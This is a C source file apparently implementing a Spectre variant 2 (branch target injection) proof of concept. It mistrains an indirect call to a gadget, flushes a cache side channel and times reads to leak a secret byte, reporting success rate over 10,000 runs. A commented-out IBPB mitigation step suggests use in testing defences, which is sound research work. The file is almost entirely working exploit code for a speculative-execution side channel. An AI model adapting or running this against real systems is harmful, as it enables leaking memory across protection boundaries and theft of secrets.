#define _GNU_SOURCE

#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/syscall.h>


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define CACHE_HIT_THRESHOLD (160)
#define GAP (1024)

uint8_t channel[256 * GAP]; // side channel to extract secret phrase
uint64_t *target; // pointer to indirect call target
char *secret = "B";


// write IA32_PRED_CMD MSR (0x49) to trigger IBPB
void write_ia32_pred_cmd() {
  int fd = open("/dev/cpu/0/msr", O_WRONLY);
  if (fd < 0) {
    perror("open /dev/cpu/0/msr");
    return;
  }
  uint64_t val = 1;
  if (pwrite(fd, &val, sizeof(val), 0x49) != sizeof(val)) {
    perror("pwrite IA32_PRED_CMD");
  }
  close(fd);
}


/*int bind_to_cpu(int cpu_core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_core, &cpuset);
    return sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}*/

int bind_to_cpu(int cpu_core) {
      unsigned long mask = 1UL << cpu_core;  
    // syscall
    if (syscall(SYS_sched_setaffinity, 0, sizeof(mask), &mask) == -1) {
        perror("bind fail");
        return -1;
    }
    //printf("bind %d success\n", cpu_core);
    return 0;
}


// mistrained target of indirect call
int gadget(char *addr)
{
  return channel[*addr * GAP]; // speculative loads fetch data into the cache
}

// safe target of indirect call
int safe_target()
{
  return 42;
}

// function that makes indirect call
// note that addr will be passed to gadget via %rdi
int victim(char *addr, int input)
{
  int junk = 0;
    for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  int result;
  // call *target
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  return result & junk;
}

// see appendix C of https://spectreattack.com/spectre.pdf
void readByte(char *addr_to_read, char result[2], int score[2])
{
  int hits[256]; // record number of cache hits
  int tries, i, j, k, mix_i, junk = 0;
  uint64_t start, elapsed;
  uint8_t *addr;
  char dummyChar = '$';

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  //for (tries = 999; tries > 0; tries--) {
     for (tries = 1; tries > 0; tries--) {
    // poison branch target predictor
    *target = (uint64_t)&gadget;
    _mm_mfence();
  for (j = 80; j > 0; j--) {
      junk ^= victim(&dummyChar, 0);
    }
    _mm_mfence();

  //Trigger IBPB
  //write_ia32_pred_cmd();


    // flush side channel
    for (i = 0; i < 256; i++)
      _mm_clflush(&channel[i * GAP]);
    _mm_mfence();

  // change to safe target
  *target = (uint64_t)&safe_target;
  _mm_mfence();

    // flush target to prolong misprediction interval
    _mm_clflush((void*) target);
    _mm_mfence();

    // call victim
    junk ^= victim(addr_to_read, 0);
    _mm_mfence();

    // now, the value of *addr_to_read should be cached even though
    // the logical execution path never calls gadget()

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = __rdtsc();
      junk ^= *addr;
      _mm_mfence(); // make sure read completes before we check the timer
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || hits[i] >= hits[j]) {
        k = j;
        j = i;
      } else if (k < 0 || hits[i] >= hits[k]) {
        k = i;
      }
    }
    if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
      break;
    }
  }

  hits[0] ^= junk; // prevent junk from being optimized out
  result[0] = (char)j;
  score[0] = hits[j];
  result[1] = (char)k;
  score[1] = hits[k];
}

int
main(int argc, char *argv[])
{

/*cpu_set_t mask;
CPU_ZERO(&mask);
CPU_SET(0, &mask); 
sched_setaffinity(0, sizeof(mask), &mask);*/


  target = (uint64_t*)malloc(sizeof(uint64_t));

  int success_count = 0;
  int total_runs = 10000;
  char result[2];
  for (int t = 0; t < total_runs; t++) {
    
    int score[2];
    int len = strlen(secret);
    char *addr = secret;

    bind_to_cpu(0);

    // attack once
    readByte(addr, result, score);
    // success or not
    if (result[0] == secret[0]) {
      success_count++;
    }
  }
  printf("success rate: %.2f%%\n", success_count * 100/ (double)total_runs);
  printf("index=%d, 0x%02X='%c'\n", (unsigned char)result[0], result[0], (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
  free(target);
  return 0;
}
